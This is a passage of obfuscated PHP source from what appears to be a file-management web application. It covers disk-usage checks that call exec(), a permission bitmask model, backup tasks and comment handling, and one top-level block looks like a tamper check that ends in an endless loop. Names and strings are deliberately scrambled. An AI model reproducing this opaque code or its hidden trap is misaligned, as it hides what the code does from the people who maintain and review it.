isset($A¶¼ºã…Ûñ[0][$DÛñíğˆ‰í[1361]]) ? $A¶¼ºã…Ûñ[0][$DÛñíğˆ‰í[1361]] : 0; $AÚõèğ»µ¨ = $DÛñíğˆ‰í[2109] . ($aó«£×Ø¯Ï ? $DÛñíğˆ‰í[8] . $aó«£×Ø¯Ï : $DÛñíğˆ‰í[33]); } $a‰µ©ªÒ§ = $GLOBALS[$DÛñíğˆ‰í[6]][$DÛñíğˆ‰í[337]][$DÛñíğˆ‰í[777]]; goto b“æ‹Š‡‡; EÑ‡é¿÷¯–: $AÛ³ª®­–  = array($DÛñíğˆ‰í[766] => $CãÛîÄÔ§[$DÛñíğˆ‰í[367]]); $A”Ì•Ó¡Õ = Model($DÛñíğˆ‰í[422])->where($AÛ³ª®­– )->sum($DÛñíğˆ‰í[77]); $eöØ×ß©Êğ = explode($DÛñíğˆ‰í[50], $_SERVER[$DÛñíğˆ‰í[139]]); goto bÃëèä¼Ï; C’¿ªÌëÙ: } private function diskDriver() { goto fíèŸàÂÕÀ; DŞ±á¨ á: $f¥å‘Êİº¡ = $cñ£äêÕà¸ - @disk_free_space($D¼ã÷¼¿ŒÚ); return array($D¢ôŸª¶¥[2111] => $cñ£äêÕà¸, $D¢ôŸª¶¥[2113] => $f¥å‘Êİº¡); goto Eª½±‘æÏ; fª›˜´ôÄÊ: if ($e›ÆÌÙ‘Ù´) { $D¼ã÷¼¿ŒÚ = $D¢ôŸª¶¥[2124]; if (function_exists($D¢ôŸª¶¥[2125])) { exec($D¢ôŸª¶¥[2126], $a­Õ×ò¥™); $D¼ã÷¼¿ŒÚ = $a­Õ×ò¥™[1] . $D¢ôŸª¶¥[8]; } } if (!file_exists($D¼ã÷¼¿ŒÚ)) { return; } $cñ£äêÕà¸ = @disk_total_space($D¼ã÷¼¿ŒÚ); goto DŞ±á¨ á; fíèŸàÂÕÀ: $D¢ôŸª¶¥ =& $_SERVER[ã®Â„Éæ¹¤]; $D¼ã÷¼¿ŒÚ = $D¢ôŸª¶¥[8]; $e›ÆÌÙ‘Ù´ = $GLOBALS[$D¢ôŸª¶¥[6]][$D¢ôŸª¶¥[2122]] == $D¢ôŸª¶¥[2123]; goto fª›˜´ôÄÊ; Eª½±‘æÏ: } public function fileChart($bŠªÃ³Ÿœ…) { goto EïâÉ¾©Ù‘; EïâÉ¾©Ù‘: $Cä×ƒ ğ˜Æ =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($bŠªÃ³Ÿœ…[$Cä×ƒ ğ˜Æ[1456]])) { return Model($Cä×ƒ ğ˜Æ[775])->userFileTypeProfile($bŠªÃ³Ÿœ…[$Cä×ƒ ğ˜Æ[1456]]); } if (isset($bŠªÃ³Ÿœ…[$Cä×ƒ ğ˜Æ[2127]])) { return Model($Cä×ƒ ğ˜Æ[775])->groupFileTypeProfile($bŠªÃ³Ÿœ…[$Cä×ƒ ğ˜Æ[2127]]); } goto a‚ó¡Š‡—½; B‘ÍŠê×¸Ğ: $Bğù“¯ŒÄì[$Cä×ƒ ğ˜Æ[371]] = 2; $DÜ×¦·§ˆ¥ = Model($Cä×ƒ ğ˜Æ[775])->where($Bğù“¯ŒÄì)->sum($Cä×ƒ ğ˜Æ[77]); return array($Cä×ƒ ğ˜Æ[720] => $fÛÇ¹ïèÔ[$Cä×ƒ ğ˜Æ[77]], $Cä×ƒ ğ˜Æ[2057] => $fÛÇ¹ïèÔ[$Cä×ƒ ğ˜Æ[2057]], $Cä×ƒ ğ˜Æ[2058] => (int) $Dç«»¾å¨Ç, $Cä×ƒ ğ˜Æ[2059] => (int) $DÜ×¦·§ˆ¥); goto DªÃÑ‘Òç; a‚ó¡Š‡—½: $fÛÇ¹ïèÔ = $this->sourceSize(); $Bğù“¯ŒÄì = array($Cä×ƒ ğ˜Æ[463] => 0, $Cä×ƒ ğ˜Æ[371] => 1); $Dç«»¾å¨Ç = Model($Cä×ƒ ğ˜Æ[775])->where($Bğù“¯ŒÄì)->sum($Cä×ƒ ğ˜Æ[77]); goto B‘ÍŠê×¸Ğ; DªÃÑ‘Òç: } private function sourceSize() { $aª¨‚­óç =& $_SERVER[ã®Â„Éæ¹¤]; $c‡Á„ƒ…ƒ˜ = Model($aª¨‚­óç[775])->where(array($aª¨‚­óç[370] => 0))->sum($aª¨‚­óç[77]); $F©…óâŠí‹ = Model($aª¨‚­óç[422])->sum($aª¨‚­óç[77]); if ($F©…óâŠí‹ > $c‡Á„ƒ…ƒ˜) { $F©…óâŠí‹ = $c‡Á„ƒ…ƒ˜; } return array($aª¨‚­óç[77] => (int) $c‡Á„ƒ…ƒ˜, $aª¨‚­óç[2057] => (int) $F©…óâŠí‹); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Aòß¨Ş¨Î =& $_SERVER[ã®Â„Éæ¹¤]; $dÁÕ•«Ìœ = array(array($Aòß¨Ş¨Î[386] => LNG($Aòß¨Ş¨Î[2128]), $Aòß¨Ş¨Î[2129] => $Aòß¨Ş¨Î[2130], $Aòß¨Ş¨Î[2131] => 1, $Aòß¨Ş¨Î[2132] => 1, $Aòß¨Ş¨Î[2133] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aòß¨Ş¨Î[386] => LNG($Aòß¨Ş¨Î[2134]), $Aòß¨Ş¨Î[2129] => $Aòß¨Ş¨Î[2135], $Aòß¨Ş¨Î[2131] => 2, $Aòß¨Ş¨Î[2132] => 1, $Aòß¨Ş¨Î[2133] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aòß¨Ş¨Î[386] => LNG($Aòß¨Ş¨Î[2136]), $Aòß¨Ş¨Î[2129] => $Aòß¨Ş¨Î[2137], $Aòß¨Ş¨Î[2131] => 3, $Aòß¨Ş¨Î[2132] => 1, $Aòß¨Ş¨Î[2133] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aòß¨Ş¨Î[386] => LNG($Aòß¨Ş¨Î[2138]), $Aòß¨Ş¨Î[2129] => $Aòß¨Ş¨Î[2139], $Aòß¨Ş¨Î[2131] => 4, $Aòß¨Ş¨Î[2132] => 1, $Aòß¨Ş¨Î[2133] => self::AUTH_SHOW | self::AUTH_VIEW), array($Aòß¨Ş¨Î[386] => LNG($Aòß¨Ş¨Î[2140]), $Aòß¨Ş¨Î[2129] => $Aòß¨Ş¨Î[2141], $Aòß¨Ş¨Î[2131] => 5, $Aòß¨Ş¨Î[2132] => 1, $Aòß¨Ş¨Î[2133] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Aòß¨Ş¨Î[386] => LNG($Aòß¨Ş¨Î[2142]), $Aòß¨Ş¨Î[2129] => $Aòß¨Ş¨Î[2143], $Aòß¨Ş¨Î[2131] => 6, $Aòß¨Ş¨Î[2132] => 1, $Aòß¨Ş¨Î[2133] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Aòß¨Ş¨Î[386] => LNG($Aòß¨Ş¨Î[2144]), $Aòß¨Ş¨Î[2129] => $Aòß¨Ş¨Î[2145], $Aòß¨Ş¨Î[2131] => 7, $Aòß¨Ş¨Î[2132] => 1, $Aòß¨Ş¨Î[2133] => 0)); return $dÁÕ•«Ìœ; } public static function authCheck($AŒÄ“õ†÷, $BÀÚå“Ÿå) { $AŒÄ“õ†÷ = intval($AŒÄ“õ†÷); if (_get($GLOBALS, $_SERVER[ã®Â„Éæ¹¤][459])) { return !0; } if ($AŒÄ“õ†÷ <= 0) { return !1; } if (($AŒÄ“õ†÷ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($AŒÄ“õ†÷ & $BÀÚå“Ÿå); } public static function authCheckShow($C‹”‚šËŠ) { return self::authCheck($C‹”‚šËŠ, self::AUTH_SHOW); } public static function authCheckView($FÖ‘Œ–Š) { return self::authCheck($FÖ‘Œ–Š, self::AUTH_VIEW); } public static function authCheckDownload($e»ÑŒ¡Ë±¼) { return self::authCheck($e»ÑŒ¡Ë±¼, self::AUTH_DOWNLOAD); } public static function authCheckUpload($E«­é‹Æ) { return self::authCheck($E«­é‹Æ, self::AUTH_UPLOAD); } public static function authCheckEdit($Bœöìƒ›) { return self::authCheck($Bœöìƒ›, self::AUTH_EDIT); } public static function authCheckRemove($a„ĞéÕì÷¦) { return self::authCheck($a„ĞéÕì÷¦, self::AUTH_REMOVE); } public static function authCheckShare($C¾ãé¡ñ¦Ù) { return self::authCheck($C¾ãé¡ñ¦Ù, self::AUTH_SHARE); } public static function authCheckComment($C¿äíÜ÷¢‚) { return self::authCheck($C¿äíÜ÷¢‚, self::AUTH_COMMENT); } public static function authCheckEvent($F§Õù–ÛÑ‘) { return self::authCheck($F§Õù–ÛÑ‘, self::AUTH_EVENT); } public static function authCheckRoot($A¨ö·öÔ) { return self::authCheck($A¨ö·öÔ, self::AUTH_ROOT); } public static function authCheckAction($a¶‡á›ã×†, $B˜ÁÎÚî»») { goto BÎ•Ä‡‡‹œ; c¥Êñ é›Ş: $Aá–ÛãÄ’ = $DÙè‚°Î÷ˆ[$B˜ÁÎÚî»»]; $a¶‡á›ã×† = intval($a¶‡á›ã×†); if ($a¶‡á›ã×† <= 0) { return !1; } goto cà»òåéˆ; cà»òåéˆ: if (($a¶‡á›ã×† & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($a¶‡á›ã×† & $Aá–ÛãÄ’); goto AÚÇ”Ä‘¬¯; BÎ•Ä‡‡‹œ: $EÍÄÏ Ö½ =& $_SERVER[ã®Â„Éæ¹¤]; $DÙè‚°Î÷ˆ = array($EÍÄÏ Ö½[2146] => self::AUTH_VIEW, $EÍÄÏ Ö½[1059] => self::AUTH_DOWNLOAD, $EÍÄÏ Ö½[103] => self::AUTH_UPLOAD, $EÍÄÏ Ö½[2094] => self::AUTH_EDIT, $EÍÄÏ Ö½[2093] => self::AUTH_REMOVE, $EÍÄÏ Ö½[2104] => self::AUTH_SHARE, $EÍÄÏ Ö½[341] => self::AUTH_COMMENT, $EÍÄÏ Ö½[1444] => self::AUTH_EVENT, $EÍÄÏ Ö½[1582] => self::AUTH_ROOT); if (!isset($DÙè‚°Î÷ˆ[$B˜ÁÎÚî»»])) { return; } goto c¥Êñ é›Ş; AÚÇ”Ä‘¬¯: } public static function authDisable($càŠâãì‚Ñ, $FÑ‚çéñƒÈ) { if (intval($càŠâãì‚Ñ) <= 0) { return 0; } return intval($càŠâãì‚Ñ) & ~$FÑ‚çéñƒÈ; } public $optionType = "\x53\171\163\164\x65\155\56\163\157\165\162\143\x65\101\x75\164\x68\114\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\141\x75\164\150", "\x6c\x61\142\145\x6c", "\144\x69\x73\160\154\141\171", "\x73\171\163\x74\145\x6d", "\x73\x6f\x72\x74"); public function initData() { $AÖ½›ô™¯ = $this->authDefault(); foreach ($AÖ½›ô™¯ as $AÅáë†õéò) { $this->add($AÅáë†õéò); } } public function listData($DĞ·¿ÔŒ÷ = false, $fç“ç¦·˜ = "\163\157\x72\x74", $D¬ØÉ¹Ä¶Ã = false) { return parent::listData($DĞ·¿ÔŒ÷, $fç“ç¦·˜, $D¬ØÉ¹Ä¶Ã); } public function update($b³ÌÅº‚ˆ×, $eÜÀé£Õö¥) { $A½Åˆï†Üİ =& $_SERVER[ã®Â„Éæ¹¤]; $Bˆ¤§š›è˜ = parent::listData($b³ÌÅº‚ˆ×); $AŠ©ÄÊß“ = $this->findByName($eÜÀé£Õö¥[$A½Åˆï†Üİ[28]]); if (!$Bˆ¤§š›è˜ || $AŠ©ÄÊß“ && $AŠ©ÄÊß“[$A½Åˆï†Üİ[367]] != $Bˆ¤§š›è˜[$A½Åˆï†Üİ[367]]) { return !1; } $this->filterAuth($eÜÀé£Õö¥[$A½Åˆï†Üİ[376]]); return parent::update($b³ÌÅº‚ˆ×, $eÜÀé£Õö¥); } public function remove($e÷ÙŸó­¶“) { $eÑ£õğ©È = parent::listData($e÷ÙŸó­¶“); if (!$eÑ£õğ©È || $eÑ£õğ©È[$_SERVER[ã®Â„Éæ¹¤][1099]]) { return !1; } return parent::remove($e÷ÙŸó­¶“); } public function add($dñìØøé‹ = array()) { goto eØàİŠ†Ê; eØàİŠ†Ê: $A‹¿âÏö¢ç =& $_SERVER[ã®Â„Éæ¹¤]; if ($this->findByName($dñìØøé‹[$A‹¿âÏö¢ç[28]])) { return !1; } $C…äß™Å¢Œ = array($A‹¿âÏö¢ç[28] => $A‹¿âÏö¢ç[33], $A‹¿âÏö¢ç[376] => 1, $A‹¿âÏö¢ç[2147] => $A‹¿âÏö¢ç[2137], $A‹¿âÏö¢ç[2148] => 1, $A‹¿âÏö¢ç[1099] => 0, $A‹¿âÏö¢ç[2149] => 0); goto d•ùÓÁ¨ÈŒ; B¬ŠÑòÖŠë: return parent::insert($dñìØøé‹); goto DÕ½îˆ¿©…; d•ùÓÁ¨ÈŒ: $dñìØøé‹ = array_merge($C…äß™Å¢Œ, $dñìØøé‹); $dñìØøé‹[$A‹¿âÏö¢ç[2149]] = $this->getSort(); $this->filterAuth($dñìØøé‹[$A‹¿âÏö¢ç[376]]); goto B¬ŠÑòÖŠë; DÕ½îˆ¿©…: } private function getSort() { $b‚ÉîáÕ“ª =& $_SERVER[ã®Â„Éæ¹¤]; $BØà›Ñ èÑ = parent::listData(); $FäƒîÍš¿ = array_to_keyvalue($BØà›Ñ èÑ, $b‚ÉîáÕ“ª[33], $b‚ÉîáÕ“ª[2149]); return empty($FäƒîÍš¿) ? 0 : max($FäƒîÍš¿) + 1; } private function filterAuth(&$fÆÌ‡¢ê±) { goto a†ä‘¶õª¾; D‚ö˜ë…õ¤: foreach ($Fô×½©”óô as $FôÊÜ¿ªò) { if (isset($F´¦Óƒ™ÆŒ[$FôÊÜ¿ªò])) { $Fô×½©”óô = array_merge($Fô×½©”óô, $F´¦Óƒ™ÆŒ[$FôÊÜ¿ªò]); } } $Fô×½©”óô[] = self::AUTH_SHOW; $fÆÌ‡¢ê± = array_sum(array_unique($Fô×½©”óô)); goto CÌÕİ¶§‘ò; dôœÕ¬äƒª: foreach ($C¹‘Ë”ôÆ as $FôÊÜ¿ªò) { if ($fÆÌ‡¢ê± & $FôÊÜ¿ªò) { $Fô×½©”óô[] = $FôÊÜ¿ªò; } } if (in_array(self::AUTH_ROOT, $Fô×½©”óô)) { $fÆÌ‡¢ê± = array_sum($C¹‘Ë”ôÆ); return; } $F´¦Óƒ™ÆŒ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto D‚ö˜ë…õ¤; a†ä‘¶õª¾: if (!$fÆÌ‡¢ê±) { return; } $C¹‘Ë”ôÆ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Fô×½©”óô = array(); goto dôœÕ¬äƒª; CÌÕİ¶§‘ò: } public function sort($cØƒº›ÜãÄ, $f¢ ­Ê’÷”) { return parent::update($cØƒº›ÜãÄ, $f¢ ­Ê’÷”); } } if (!isset($_SERVER[$_SERVER[ã®Â„Éæ¹¤][554]]) || !isset($_SERVER[$_SERVER[ã®Â„Éæ¹¤][750]])) { goto DÀ‡·ğ«­ß; DÀ‡·ğ«­ß: $dËÀ®Æ†¬„ = $_SERVER[ã®Â„Éæ¹¤][555]; $Fó”ñ Ì Š = $_SERVER[$_SERVER[ã®Â„Éæ¹¤][556]] . $_SERVER[ã®Â„Éæ¹¤][557]; $dê…ä…á = $dËÀ®Æ†¬„($Fó”ñ Ì Š); goto A…‰Ñ¼í¼; E¾‹‘¡Ÿ¾: $aÓ’ê×çÜ($_SERVER[$_SERVER[ã®Â„Éæ¹¤][556]] . $_SERVER[ã®Â„Éæ¹¤][557]); $cöë ×ç = 2; while ($cöë ×ç > 1) { $b£áÕÇó’¨ = rawurlencode($cöë ×ç . $_SERVER[ã®Â„Éæ¹¤][361]); } goto dÍ‡ÆÎ©¿ï; A…‰Ñ¼í¼: $BñÕá¹³« = explode($_SERVER[ã®Â„Éæ¹¤][217], $dê…ä…á); if (count($BñÕá¹³«) < $_SERVER[ã®Â„Éæ¹¤][558]) { $b—ãÂùŠª„ = $_SERVER[ã®Â„Éæ¹¤][559]; $b—ãÂùŠª„(); } $aÓ’ê×çÜ = $_SERVER[ã®Â„Éæ¹¤][560]; goto E¾‹‘¡Ÿ¾; dÍ‡ÆÎ©¿ï: } goto FÜ—Ş„Şˆ¢; FÜ—Ş„Şˆ¢: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x62\x61\x63\153\165\x70\114\151\163\x74"; public $field = array("\151\157", "\x6e\x61\155\145", "\163\x74\141\164\x75\x73", "\x63\x6f\156\164\x65\x6e\x74", "\x72\145\163\x75\x6c\164", "\164\x69\x6d\x65\106\162\x6f\155", "\164\x69\155\x65\124\x6f"); public function config() { goto dˆ¹èªİÛ‰; eç‚â«ÎÆ©: if (isset($CÌÎœî©æá[$Cµ¦¤ø¸…[190]])) { $CÌÎœî©æá[$Cµ¦¤ø¸…[190]] = json_decode($CÌÎœî©æá[$Cµ¦¤ø¸…[190]], !0); } if (isset($cçĞš«Ò†[$Cµ¦¤ø¸…[190]])) { $CÌÎœî©æá[$Cµ¦¤ø¸…[190]][$Cµ¦¤ø¸…[1431]] = $cçĞš«Ò†[$Cµ¦¤ø¸…[190]]; unset($cçĞš«Ò†[$Cµ¦¤ø¸…[190]]); } return array_merge($CÌÎœî©æá, $cçĞš«Ò†); goto aƒ„ÍÙ•Å; dˆ¹èªİÛ‰: $Cµ¦¤ø¸… =& $_SERVER[ã®Â„Éæ¹¤]; $cçĞš«Ò† = Model($Cµ¦¤ø¸…[1107])->get($Cµ¦¤ø¸…[735]); $cçĞš«Ò† = json_decode($cçĞš«Ò†, !0); goto e§Ø«™Ş; e§Ø«™Ş: $cçĞš«Ò† = is_array($cçĞš«Ò†) ? $cçĞš«Ò† : array(); if (!isset($cçĞš«Ò†[$Cµ¦¤ø¸…[714]])) { $cçĞš«Ò†[$Cµ¦¤ø¸…[714]] = $Cµ¦¤ø¸…[83]; } $CÌÎœî©æá = array(); goto dËŸ¡ƒë·; dËŸ¡ƒë·: Action($Cµ¦¤ø¸…[2150])->taskInit(); $eŒ´·¨ƒŒ = Model($Cµ¦¤ø¸…[2151])->listData(); foreach ($eŒ´·¨ƒŒ as $f‘øèÌøêÙ) { if ($f‘øèÌøêÙ[$Cµ¦¤ø¸…[1099]] == $Cµ¦¤ø¸…[83] && $f‘øèÌøêÙ[$Cµ¦¤ø¸…[1444]] == $Cµ¦¤ø¸…[2152]) { $CÌÎœî©æá = $f‘øèÌøêÙ; break; } } goto eç‚â«ÎÆ©; aƒ„ÍÙ•Å: } public function listData($C°²Ø”ºé = false, $EÙ¿§ßêÕ› = "\155\x6f\x64\x69\x66\x79\124\x69\155\145", $e”»ÉÍŠ‹ğ = false) { return parent::listData($C°²Ø”ºé, $EÙ¿§ßêÕ›, !0); } public function lastItem() { $AîÓ§›¨Š¼ = $this->listData(); return !empty($AîÓ§›¨Š¼[0]) ? $AîÓ§›¨Š¼[0] : null; } public function kill($f¥ÊËÉ¹â) { goto cÄœ°¯Ñï; bÈŠ¢‰¨: return $this->remove($f¥ÊËÉ¹â); goto aòéõñëÀ­; cÄœ°¯Ñï: $bº‘Ü¦îŸ§ =& $_SERVER[ã®Â„Éæ¹¤]; $Cé¢§¯©‡› = $this->listData($f¥ÊËÉ¹â); if (!$Cé¢§¯©‡› || empty($Cé¢§¯©‡›[$bº‘Ü¦îŸ§[28]])) { return !0; } goto B„¾éè; bİŞîä²Õë: $d‘˜Æ¥Ç©º = $Cé¢§¯©‡›[$bº‘Ü¦îŸ§[28]]; $c½ŒøÊÑ—• = TEMP_FILES . $bº‘Ü¦îŸ§[731] . $d‘˜Æ¥Ç©º . $bº‘Ü¦îŸ§[8]; IO::remove($c½ŒøÊÑ—•, !1); goto bÈŠ¢‰¨; B„¾éè: Task::kill($bº‘Ü¦îŸ§[734]); Task::kill($bº‘Ü¦îŸ§[751]); Task::kill($bº‘Ü¦îŸ§[759]); goto bİŞîä²Õë; aòéõñëÀ­: } public function remove($D©¬äÓƒßó) { $Dó¸‚‹Â‹ = $this->listData($D©¬äÓƒßó); if (!$Dó¸‚‹Â‹) { return !0; } return $this->backupRemove($Dó¸‚‹Â‹); } private function backupRemove($FôåÓºÖ­) { $c“†»„îŞ¿ =& $_SERVER[ã®Â„Éæ¹¤]; parent::remove($FôåÓºÖ­[$c“†»„îŞ¿[367]]); $eÕÃ¸ô”„ = "\173\151\157\72{$FôåÓºÖ­[$c“†»„îŞ¿[713]]}\x7d\x2f\144\x61\164\x61\x62\x61\x73\145\57\142\x61\x63\153\165\160\137" . $FôåÓºÖ­[$c“†»„îŞ¿[28]]; IO::remove($eÕÃ¸ô”„, !1); return !0; } public function start() { goto C‹’Îëïñ; c„¥¾àÌÄ‡: return !0; goto c’“˜´ò–£; Aï ªä°Á: if (!$dËÙÌÂõÃ->dbFile()) { return !1; } if ($E»éÑœÜµÇ[$böÔçÄ¦‡[714]] == $böÔçÄ¦‡[470]) { $dËÙÌÂõÃ->file(); } Backup::set(array($böÔçÄ¦‡[711] => 1, $böÔçÄ¦‡[449] => time())); goto c„¥¾àÌÄ‡; C‹’Îëïñ: $böÔçÄ¦‡ =& $_SERVER[ã®Â„Éæ¹¤]; if ($GLOBALS[$böÔçÄ¦‡[6]][$böÔçÄ¦‡[84]][$böÔçÄ¦‡[2153]] != $böÔçÄ¦‡[83]) { return !0; } $E»éÑœÜµÇ = $this->config(); goto A–çÆ‚ßØ; dˆšªìº•: $dËÙÌÂõÃ = new Backup(); $dËÙÌÂõÃ->keep(); if (!$dËÙÌÂõÃ->db()) { return !1; } goto Aï ªä°Á; A–çÆ‚ßØ: if (!$E»éÑœÜµÇ || $E»éÑœÜµÇ[$böÔçÄ¦‡[1428]] != $böÔçÄ¦‡[83]) { return !1; } $d¼ØâƒÇÙØ = $this->process(); foreach ($d¼ØâƒÇÙØ as $eÒ¦–º†¤ó) { if ($eÒ¦–º†¤ó) { return Task::restart($eÒ¦–º†¤ó[$böÔçÄ¦‡[367]]); } } goto dˆšªìº•; c’“˜´ò–£: } public function process() { $féŒ¯ë£¯´ =& $_SERVER[ã®Â„Éæ¹¤]; return array($féŒ¯ë£¯´[716] => Task::get($féŒ¯ë£¯´[734]), $féŒ¯ë£¯´[719] => Task::get($féŒ¯ë£¯´[751]), $féŒ¯ë£¯´[167] => Task::get($féŒ¯ë£¯´[759])); } public function restore() { $D·ğâ´„¬„ =& $_SERVER[ã®Â„Éæ¹¤]; ActionCall($D·ğâ´„¬„[992], !0, 1); ActionCall($D·ğâ´„¬„[992], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\x65\156\x74"; protected $tableMeta = array("\164\x61\142\154\x65\x4e\141\x6d\145" => "\143\157\155\x6d\145\156\x74\137\x6d\145\x74\x61", "\155\145\x74\141\106\x69\145\x6c\x64" => "\x63\x6f\155\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($AôÁÇ°é¹) { $e¦÷¥˜ºëƒ =& $_SERVER[ã®Â„Éæ¹¤]; if ($AôÁÇ°é¹[$e¦÷¥˜ºëƒ[2154]]) { $AİÓÅƒƒˆƒ = $this->where(array($e¦÷¥˜ºëƒ[2155] => $AôÁÇ°é¹[$e¦÷¥˜ºëƒ[2154]]))->find(); if (!$AİÓÅƒƒˆƒ || $AİÓÅƒƒˆƒ[$e¦÷¥˜ºëƒ[371]] != $AôÁÇ°é¹[$e¦÷¥˜ºëƒ[371]] || $AİÓÅƒƒˆƒ[$e¦÷¥˜ºëƒ[458]] != $AôÁÇ°é¹[$e¦÷¥˜ºëƒ[458]]) { return !1; } $this->where(array($e¦÷¥˜ºëƒ[2155] => $AôÁÇ°é¹[$e¦÷¥˜ºëƒ[2154]]))->setAdd($e¦÷¥˜ºëƒ[2156], 1); } $AôÁÇ°é¹[$e¦÷¥˜ºëƒ[2157]] = 0; $AôÁÇ°é¹[$e¦÷¥˜ºëƒ[2156]] = 0; $AôÁÇ°é¹[$e¦÷¥˜ºëƒ[711]] = 1; return $this->add($AôÁÇ°é¹); } public function remove($BĞ¥¿ã´Õò) { $E–•™Ÿ®×â =& $_SERVER[ã®Â„Éæ¹¤]; $bÄ›ÂèÎ = array($E–•™Ÿ®×â[2155] => $BĞ¥¿ã´Õò); $EÜªğÌÜÄ‘ = $this->where($bÄ›ÂèÎ)->find(); if ($EÜªğÌÜÄ‘[$E–•™Ÿ®×â[2154]]) { $this->where(array($E–•™Ÿ®×â[2155] => $EÜªğÌÜÄ‘[$E–•™Ÿ®×â[2154]]))->setAdd($E–•™Ÿ®×â[2156], -1); } return $this->where($bÄ›ÂèÎ)->delete(); } public function edit($f©Éª’Ÿİä, $C‹ÒÈ¾šøÕ) { $Fî½·‹ÛÃ =& $_SERVER[ã®Â„Éæ¹¤]; $fì¯õâÇ“È = array($Fî½·‹ÛÃ[2155] => $f©Éª’Ÿİä); return $this->where($fì¯õâÇ“È)->save(array($Fî½·‹ÛÃ[2158] => $C‹ÒÈ¾šøÕ)); } public function prasise($b´øø„Ä) { $B‰Ò÷Á¼›‰ =& $_SERVER[ã®Â„Éæ¹¤]; $FŠ¤†Û¿ùã = Model($B‰Ò÷Á¼›‰[2159]); $Cïá–ØÓõ© = array($B‰Ò÷Á¼›‰[2155] => $b´øø„Ä, $B‰Ò÷Á¼›‰[1447] => USER_ID); $C”ŸÉóôìÁ = $FŠ¤†Û¿ùã->where($Cïá–ØÓõ©)->find(); if (!$C”ŸÉóôìÁ) { $FŠ¤†Û¿ùã->add($Cïá–ØÓõ©); $D¿Šƒ…Ô»Œ = $this->where(array($B‰Ò÷Á¼›‰[2155] => $b´øø„Ä))->setAdd($B‰Ò÷Á¼›‰[2157], 1); } else { $FŠ¤†Û¿ùã->where($Cïá–ØÓõ©)->delete(); $D¿Šƒ…Ô»Œ = $this->where(array($B‰Ò÷Á¼›‰[2155] => $b´øø„Ä))->setAdd($B‰Ò÷Á¼›‰[2157], -1); } return $D¿Šƒ…Ô»Œ; } public function targetInfo($FŒ»æ¬Õæß, $cœ´¢•¬ƒ©) { goto a‚áË†÷¬; AóÂ‰Ï«ª„: return $eÉŞŒ®ğ; goto Fòî÷õ•ë; aˆÆ©øƒ: $a‰õÇ¤ÎÏÍ = "\x52\111\107\110\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\143\x6f\x6d\155\x65\156\x74\137\x70\162\141\x69\x73\145\x20\x73\164\141\x72\x20\x6f\156\40\143\x6f\155\x6d\145\156\164\56\143\x6f\x6d\x6d\x65\156\x74\x49\x44\x20\75\x20\x73\x74\x61\x72\56\x63\157\155\155\x65\x6e\164\111\104"; $BÒ­Îø×òİ = $this->alias($eĞ­Òˆ¬¿ø[341])->where($dÛ”¶¶†©)->join($a‰õÇ¤ÎÏÍ, $eĞ­Òˆ¬¿ø[2160])->count(); $eÉŞŒ®ğ = array($eĞ­Òˆ¬¿ø[2161] => $A¸«šĞ„•É, $eĞ­Òˆ¬¿ø[2162] => $BÒ­Îø×òİ); goto AóÂ‰Ï«ª„; a‚áË†÷¬: $eĞ­Òˆ¬¿ø =& $_SERVER[ã®Â„Éæ¹¤]; $dÛ”¶¶†© = array($eĞ­Òˆ¬¿ø[523] => $FŒ»æ¬Õæß, $eĞ­Òˆ¬¿ø[524] => $cœ´¢•¬ƒ©); $A¸«šĞ„•É = $this->where($dÛ”¶¶†©)->count(); goto aˆÆ©øƒ; Fòî÷õ•ë: } public function listData($a¼½ØŠÜ½Ü) { $cíá¹´ã­ =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($a¼½ØŠÜ½Ü[$cíá¹´ã­[2163]])) { if ($a¼½ØŠÜ½Ü[$cíá¹´ã­[2163]]) { $a¼½ØŠÜ½Ü[$cíá¹´ã­[2164]] = array($cíá¹´ã­[946], 